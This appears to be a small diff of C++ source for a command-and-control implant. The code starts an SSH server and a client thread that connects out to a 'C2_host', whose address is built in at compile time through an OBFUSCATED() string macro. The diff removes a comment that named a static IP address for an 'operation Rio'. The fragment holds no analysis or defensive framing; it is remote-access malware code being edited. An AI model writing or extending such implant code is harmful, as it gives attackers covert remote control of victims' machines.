@@ -106,7 +106,6 @@ void start_server_client(SSHServer* server, SSHClient* client, int* ssh_server_p
         return;
     }
 
-
     // Client
     std::thread client_thread(client->run, username, C2_host, *ssh_server_port_int);
 
@@ -169,9 +168,7 @@ int main(int argc, char** argv){
     strncat(username, "ous", 100);
     
     
-#ifdef C2_IP
-    //We need the new IP
-    //Static IP for operation Rio 35.237.100.68
+#ifdef C2_IP // set static IP
     strcat_s(C2_host, sizeof(C2_host), OBFUSCATED(C2_IP));
 #else
     parse_args(argc, argv, C2_host, username);
